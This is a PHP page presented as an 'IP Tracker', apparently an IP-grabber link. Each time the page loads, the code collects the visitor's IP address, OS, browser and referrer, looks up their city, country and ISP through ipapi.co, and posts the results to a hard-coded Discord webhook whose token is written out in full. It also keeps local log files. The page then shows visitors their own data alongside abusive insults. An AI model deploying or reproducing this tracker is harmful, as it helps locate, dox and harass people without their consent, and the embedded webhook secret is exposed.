<?php
ob_start();
error_reporting(E_ALL);

// Enhanced IP detection function with validation
function get_ip_address()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && validate_ip($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false) {
            $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($iplist as $ip) {
                if (validate_ip($ip))
                    return $ip;
            }
        } else {
            if (validate_ip($_SERVER['HTTP_X_FORWARDED_FOR']))
                return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    }
    return $_SERVER['REMOTE_ADDR'];
}

function validate_ip($ip)
{
    if (strtolower($ip) === 'unknown') return false;
    $ip = ip2long($ip);
    if ($ip !== false && $ip !== -1) {
        $ip = sprintf('%u', $ip);
        if (($ip >= 0 && $ip <= 50331647) || 
            ($ip >= 167772160 && $ip <= 184549375) || 
            ($ip >= 2130706432 && $ip <= 2147483647) || 
            ($ip >= 2851995648 && $ip <= 2852061183) || 
            ($ip >= 2886729728 && $ip <= 2887778303) || 
            ($ip >= 3221225984 && $ip <= 3221226239) || 
            ($ip >= 3232235520 && $ip <= 3232301055) || 
            ($ip >= 4294967040)) return false;
    }
    return true;
}

// OS and Browser detection
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform = "Unknown OS";
    $os_array = array(
        '/windows nt 10/i'     =>  'Windows 10',
        '/windows nt 6.3/i'    =>  'Windows 8.1',
        '/windows nt 6.2/i'    =>  'Windows 8',
        '/windows nt 6.1/i'    =>  'Windows 7',
        '/windows nt 6.0/i'    =>  'Windows Vista',
        '/windows nt 5.2/i'    =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'    =>  'Windows XP',
        '/windows xp/i'        =>  'Windows XP',
        '/windows nt 5.0/i'    =>  'Windows 2000',
        '/windows me/i'        =>  'Windows ME',
        '/win98/i'             =>  'Windows 98',
        '/win95/i'             =>  'Windows 95',
        '/win16/i'             =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/linux/i'             =>  'Linux',
        '/ubuntu/i'            =>  'Ubuntu',
        '/iphone/i'            =>  'iPhone',
        '/android/i'           =>  'Android',
        '/blackberry/i'        =>  'BlackBerry',
        '/webos/i'             =>  'Mobile',
    );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }   
    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/opera/i'      =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/mobile/i'     =>  'Mobile Browser'
    );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }
    return $browser;
}

// Your Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1376717625169543228/-M_cKWR5l4Xra3BALwxfrjsWKedUdUV-6focu5z9ohrHZI8bq7YAnRNtdIuKUjdypJ9J";

// Get visitor data
$visitorIP = get_ip_address();
$user_os = getOS();
$user_browser = getBrowser();
$site_refer = $_SERVER['HTTP_REFERER'] ?? '';
$site = $site_refer == "" ? "Direct connection" : $site_refer;

date_default_timezone_set('UTC');
$time = date('Y-m-d H:i:s');

// Get geolocation data
$json = @file_get_contents("https://ipapi.co/" . $visitorIP . "/json/");
$geoData = json_decode($json, true);
$country = $geoData['country_name'] ?? 'Unknown';
$city = $geoData['city'] ?? 'Unknown';
$isp = $geoData['org'] ?? 'Unknown';

// Construct webhook message
$message = "🚨 **NEW VISITOR DETECTED** 🚨\n";
$message .= "**IP:** `$visitorIP`\n";
$message .= "**Location:** $city, $country\n";
$message .= "**OS:** $user_os\n";
$message .= "**Browser:** $user_browser\n";
$message .= "**ISP:** $isp\n";
$message .= "**Time:** $time\n";
$message .= "**Referrer:** $site\n";
$message .= "**User Agent:** `" . substr($user_agent, 0, 100) . "`";

$make_json = json_encode(array('content' => $message));

// Send using cURL
$exec = curl_init($webhookUrl);
curl_setopt($exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($exec, CURLOPT_POST, 1);
curl_setopt($exec, CURLOPT_POSTFIELDS, $make_json);
curl_setopt($exec, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($exec);
$httpCode = curl_getinfo($exec, CURLINFO_HTTP_CODE);
curl_close($exec);

// Log webhook result
file_put_contents("webhook_debug.txt", "=== Webhook attempt: " . date('Y-m-d H:i:s') . " ===\nURL: " . $webhookUrl . "\nPayload: " . $make_json . "\nHTTP Code: " . $httpCode . "\nResponse: " . $response . "\n===================\n\n", FILE_APPEND);

// Log to file as backup
file_put_contents("logs.txt", "IP: $visitorIP | OS: $user_os | Browser: $user_browser | Location: $city, $country | Time: $time\n", FILE_APPEND);
?>

<!DOCTYPE html>
<html>
<head>
    <title>IP Tracker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f0f0f0;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-top: 20px;
            text-align: left;
        }
        .info-item {
            background: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            border-left: 4px solid #007bff;
        }
        .info-label {
            font-weight: bold;
            color: #495057;
        }
        .info-value {
            color: #212529;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🌐 Welcome to My Website fucking bitch</h1>
        <p>Your visit has been logged and sent to ur mom!</p>
        <div class="info-grid">
            <div class="info-item">
                <div class="info-label">IP Address:</div>
                <div class="info-value"><?php echo htmlspecialchars($visitorIP); ?></div>
            </div>
            <div class="info-item">
                <div class="info-label">Operating System:</div>
                <div class="info-value"><?php echo htmlspecialchars($user_os); ?></div>
            </div>
            <div class="info-item">
                <div class="info-label">Browser:</div>
                <div class="info-value"><?php echo htmlspecialchars($user_browser); ?></div>
            </div>
            <div class="info-item">
                <div class="info-label">Country:</div>
                <div class="info-value"><?php echo htmlspecialchars($country); ?></div>
            </div>
            <div class="info-item">
                <div class="info-label">City:</div>
                <div class="info-value"><?php echo htmlspecialchars($city); ?></div>
            </div>
            <div class="info-item">
                <div class="info-label">ISP:</div>
                <div class="info-value"><?php echo htmlspecialchars($isp); ?></div>
            </div>
        </div>
    </div>
</body>
</html>
